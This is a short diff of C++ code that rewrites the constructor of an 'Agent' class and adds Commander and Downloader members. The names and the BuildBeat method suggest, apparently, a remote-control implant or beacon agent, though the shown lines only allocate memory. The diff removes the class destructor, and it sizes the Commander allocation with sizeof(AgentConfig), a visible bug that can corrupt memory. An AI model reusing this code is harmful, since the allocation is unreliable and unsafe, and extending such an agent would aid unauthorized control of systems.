@@ -6,17 +6,17 @@
 
 Agent::Agent()
 {
-	this->info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
-	*this->info = AgentInfo();
+	info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
+	*info = AgentInfo();
 	
-	this->config  = (AgentConfig*)MemAllocLocal(sizeof(AgentConfig));
-	*this->config = AgentConfig();
+	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
+	*config = AgentConfig();
 
-}
+	commander = (Commander*) MemAllocLocal(sizeof(AgentConfig));
+	*commander = Commander(this);
 
-Agent::~Agent()
-{
-
+	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
+	*downloader = Downloader( config->download_chunk_size );
 }
 
 LPSTR Agent::BuildBeat()
